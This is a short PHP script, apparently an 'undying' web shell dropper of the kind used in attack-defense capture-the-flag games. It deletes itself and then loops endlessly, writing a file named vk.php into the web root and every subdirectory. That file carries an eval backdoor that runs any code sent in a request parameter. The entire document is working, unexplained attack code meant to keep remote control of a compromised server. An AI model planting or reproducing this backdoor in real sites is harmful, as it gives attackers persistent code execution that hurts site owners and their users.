<?php
    set_time_limit(0);
    ignore_user_abort(1);

    $shell = <<<EOT
your shell in base64
EOT;

    function writeShell($path)
    {
        global $shell;
        $tmp = $path . DIRECTORY_SEPARATOR . "vk.php";
        file_put_contents($tmp, base64_decode($shell));
        @chmod($tmp, 0550);
        // 后门 QAQ
        $vk = base64_encode('<?php @eval($_REQUEST["vk666"]);');
        file_put_contents($tmp, base64_decode($vk));
        @chmod($tmp, 0550);
    }
    function walkDir($path, $cb=null)
    {
        $list = glob($path . DIRECTORY_SEPARATOR . '*');
        foreach ($list as $f) {
            if (is_dir($f)) {
                writeShell($f);
            }
        }
    }

    unlink(__FILE__);
    $path = (file_exists($path.DIRECTORY_SEPARATOR."index.php")
        && $_SERVER['DOCUMENT_ROOT'] != "") ? $_SERVER['DOCUMENT_ROOT'] : "./";
    while (1) {
        writeShell($path);
        walkDir($path);
        usleep(50);
    }
